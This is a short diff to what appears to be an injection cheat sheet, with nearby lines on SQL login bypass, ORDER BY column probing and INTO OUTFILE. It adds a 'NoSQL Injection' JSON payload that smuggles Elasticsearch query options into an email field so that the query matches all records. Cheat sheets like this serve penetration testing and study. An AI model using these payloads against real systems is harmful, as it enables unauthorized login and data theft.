@@ -118,6 +118,15 @@ Basic Login hacking:
 ... ORDER BY 1, 2, 3, 4, 5, 6, ... 10, 15
 ```
 
+NoSQL Injection:
+```json
+{
+  "user": "username",
+  "email": "\"\",\"zero_terms_query\":\"all\",\"analyzer\":\"whitespace\"",
+  "password": "password"
+}
+```
+
 Extract data to file and read it:
 ```sql
 SELECT ... INTO OUTFILE ;
